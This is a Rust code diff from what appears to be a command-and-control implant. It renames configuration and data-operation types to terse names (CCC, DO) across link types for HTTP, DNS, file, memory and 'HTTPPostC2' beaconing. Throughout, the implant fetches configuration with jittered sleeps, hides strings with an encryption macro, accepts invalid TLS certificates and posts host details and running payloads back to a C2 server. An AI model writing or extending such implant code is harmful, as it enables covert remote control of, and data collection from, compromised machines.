@@ -1,5 +1,5 @@
-use crate::config::Config;
-use crate::dataoperation::{apply_all_dataoperations, DataOperation, UnApplyDataOperation};
+use crate::config::CCC;
+use crate::dataoperation::{apply_all_dataoperations, DO, UnApplyDataOperation};
 use crate::link_util::bytes_to_gigabytes_string;
 use crate::link_util::cmdline;
 use crate::link_util::get_domain_name;
@@ -45,13 +45,13 @@ impl Link {
 
     pub fn fetch_config(
         &self,
-        config: &Config,
+        config: &CCC,
         advanced: &Advanced,
         link_nb: i32,
         session_id: &String,
         //running_thread: &Vec<Payload>,
         run_data: &RunData,
-    ) -> Result<Config, anyhow::Error> {
+    ) -> Result<CCC, anyhow::Error> {
         let result = self.fetch_data_with_post(session_id, run_data, config);
         let data: Vec<u8> = match result {
             Ok(data) => data,
@@ -64,7 +64,7 @@ impl Link {
             ),
         };
         debug!("{}", encrypt_string!("deserialized data"));
-        let newconfig: Config = match serde_json::from_slice(&data) {
+        let newconfig: CCC = match serde_json::from_slice(&data) {
             Ok(newconfig) => newconfig,
             Err(error) => bail!(
                 "{}{}{}{}",
@@ -108,14 +108,14 @@ impl Link {
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct HTTPLink {
     pub url: String,
-    pub dataoperation: Vec<DataOperation>,
+    pub dataoperation: Vec<DO>,
     pub sleep: u64,
     pub jitt: u64,
 }
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct DNSLink {
     pub dns: String,
-    pub dataoperation: Vec<DataOperation>,
+    pub dataoperation: Vec<DO>,
     pub sleep: u64,
     pub jitt: u64,
 }
@@ -123,7 +123,7 @@ pub struct DNSLink {
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct FileLink {
     pub file_path: String,
-    pub dataoperation: Vec<DataOperation>,
+    pub dataoperation: Vec<DO>,
     pub sleep: u64,
     pub jitt: u64,
 }
@@ -131,7 +131,7 @@ pub struct FileLink {
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct MemoryLink {
     pub memory_nb: i32,
-    pub dataoperation: Vec<DataOperation>,
+    pub dataoperation: Vec<DO>,
     pub sleep: u64,
     pub jitt: u64,
 }
@@ -139,23 +139,23 @@ pub struct MemoryLink {
 #[derive(Serialize, Deserialize, PartialEq, Clone)]
 pub struct HTTPPostC2Link {
     pub url: String,
-    pub dataoperation: Vec<DataOperation>,
-    pub dataoperation_post: Vec<DataOperation>,
+    pub dataoperation: Vec<DO>,
+    pub dataoperation_post: Vec<DO>,
     pub sleep: u64,
     pub jitt: u64,
 }
 
 pub trait LinkFetch {
-    fn download_data(&self, config: &Config) -> Result<Vec<u8>, anyhow::Error>;
+    fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error>;
     fn download_data_post(
         &self,
         session_id: &String,
         //running_thread: &Vec<Payload>,
         run_data: &RunData,
-        config: &Config,
+        config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error>;
     fn get_target(&self) -> String;
-    fn get_dataoperation(&self) -> Vec<DataOperation>;
+    fn get_dataoperation(&self) -> Vec<DO>;
     fn get_sleep(&self) -> u64;
     fn get_jitt(&self) -> u64;
 
@@ -181,7 +181,7 @@ pub trait LinkFetch {
 
 
 
-    fn fetch_data(&self, config: &Config) -> Result<Vec<u8>, anyhow::Error> {
+    fn fetch_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         self.sleep_and_jitt();
         let data = self.download_data(config)?;
         self.un_apply_all_dataoperations(data)
@@ -192,7 +192,7 @@ pub trait LinkFetch {
         session_id: &String,
         //running_thread: &Vec<Payload>,
         run_data: &RunData,
-        config: &Config,
+        config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
         self.sleep_and_jitt();
         let data = self.download_data_post(session_id, run_data, config)?;
@@ -201,7 +201,7 @@ pub trait LinkFetch {
 }
 
 impl LinkFetch for Link {
-    fn download_data(&self, config: &Config) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
             Link::HTTP(link) => link.download_data(config),
             Link::DNS(link) => link.download_data(config),
@@ -217,7 +217,7 @@ impl LinkFetch for Link {
         session_id: &String,
         //running_thread: &Vec<Payload>,
         run_data: &RunData,
-        config: &Config,
+        config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
         match &self {
             Link::HTTP(link) => link.download_data(config),
@@ -237,7 +237,7 @@ impl LinkFetch for Link {
             Link::HTTPPostC2(link) => link.get_target(),
         }
     }
-    fn get_dataoperation(&self) -> Vec<DataOperation> {
+    fn get_dataoperation(&self) -> Vec<DO> {
         match &self {
             Link::HTTP(link) => link.get_dataoperation(),
             Link::DNS(link) => link.get_dataoperation(),
@@ -268,7 +268,7 @@ impl LinkFetch for Link {
 }
 
 impl LinkFetch for FileLink {
-    fn download_data(&self, _config: &Config) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         read_file(&self.get_target())
     }
     fn download_data_post(
@@ -276,7 +276,7 @@ impl LinkFetch for FileLink {
         _session_id: &String,
         //running_thread: &Vec<Payload>,
         _run_data: &RunData,
-        _config: &Config,
+        _config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -284,7 +284,7 @@ impl LinkFetch for FileLink {
     fn get_target(&self) -> String {
         format!("{}", self.file_path)
     }
-    fn get_dataoperation(&self) -> Vec<DataOperation> {
+    fn get_dataoperation(&self) -> Vec<DO> {
         self.dataoperation.to_vec()
     }
     fn get_sleep(&self) -> u64 {
@@ -296,7 +296,7 @@ impl LinkFetch for FileLink {
 }
 
 impl LinkFetch for MemoryLink {
-    fn download_data(&self, _config: &Config) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         access_memory(self.memory_nb)
     }
     fn download_data_post(
@@ -304,7 +304,7 @@ impl LinkFetch for MemoryLink {
         _session_id: &String,
         //running_thread: &Vec<Payload>,
         _run_data: &RunData,
-        _config: &Config,
+        _config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -312,7 +312,7 @@ impl LinkFetch for MemoryLink {
     fn get_target(&self) -> String {
         format!("{}{}", encrypt_string!("MEMORY_"), self.memory_nb)
     }
-    fn get_dataoperation(&self) -> Vec<DataOperation> {
+    fn get_dataoperation(&self) -> Vec<DO> {
         self.dataoperation.to_vec()
     }
     fn get_sleep(&self) -> u64 {
@@ -324,7 +324,7 @@ impl LinkFetch for MemoryLink {
 }
 
 impl LinkFetch for DNSLink {
-    fn download_data(&self, _config: &Config) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
     fn download_data_post(
@@ -332,7 +332,7 @@ impl LinkFetch for DNSLink {
         _session_id: &String,
         //running_thread: &Vec<Payload>,
         _run_data: &RunData,
-        _config: &Config,
+        _config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -340,7 +340,7 @@ impl LinkFetch for DNSLink {
     fn get_target(&self) -> String {
         format!("{}", self.dns)
     }
-    fn get_dataoperation(&self) -> Vec<DataOperation> {
+    fn get_dataoperation(&self) -> Vec<DO> {
         self.dataoperation.to_vec()
     }
     fn get_sleep(&self) -> u64 {
@@ -352,7 +352,7 @@ impl LinkFetch for DNSLink {
 }
 
 impl LinkFetch for HTTPLink {
-    fn download_data(&self, config: &Config) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self, config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         let build: attohttpc::RequestBuilder = attohttpc::get(&self.get_target())
             .danger_accept_invalid_certs(true)
             .header(header::USER_AGENT, &config.link_user_agent)
@@ -367,7 +367,7 @@ impl LinkFetch for HTTPLink {
         _session_id: &String,
         //running_thread: &Vec<Payload>,
         _run_data: &RunData,
-        _config: &Config,
+        _config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
@@ -375,7 +375,7 @@ impl LinkFetch for HTTPLink {
     fn get_target(&self) -> String {
         format!("{}", self.url)
     }
-    fn get_dataoperation(&self) -> Vec<DataOperation> {
+    fn get_dataoperation(&self) -> Vec<DO> {
         self.dataoperation.to_vec()
     }
     fn get_sleep(&self) -> u64 {
@@ -413,7 +413,7 @@ pub struct PostToC2 {
     pub used_memory: String,
     pub nb_cpu: usize,
 
-    pub data_operation: Vec<DataOperation>,
+    pub data_operation: Vec<DO>,
     //pub running_thread: Vec<String>,
     pub running_thread_payload: Vec<String>,
     pub runonce_payload: Vec<String>,
@@ -426,7 +426,7 @@ pub struct PostToC2 {
 }
 
 impl LinkFetch for HTTPPostC2Link {
-    fn download_data(&self, _config: &Config) -> Result<Vec<u8>, anyhow::Error> {
+    fn download_data(&self, _config: &CCC) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
     fn download_data_post(
@@ -434,7 +434,7 @@ impl LinkFetch for HTTPPostC2Link {
         session_id: &String,
         //running_thread: &Vec<Payload>,
         run_data: &RunData,
-        config: &Config,
+        config: &CCC,
     ) -> Result<Vec<u8>, anyhow::Error> {
 
 
@@ -545,7 +545,7 @@ impl LinkFetch for HTTPPostC2Link {
     fn get_target(&self) -> String {
         format!("{}", self.url)
     }
-    fn get_dataoperation(&self) -> Vec<DataOperation> {
+    fn get_dataoperation(&self) -> Vec<DO> {
         self.dataoperation.to_vec()
     }
     fn get_sleep(&self) -> u64 {
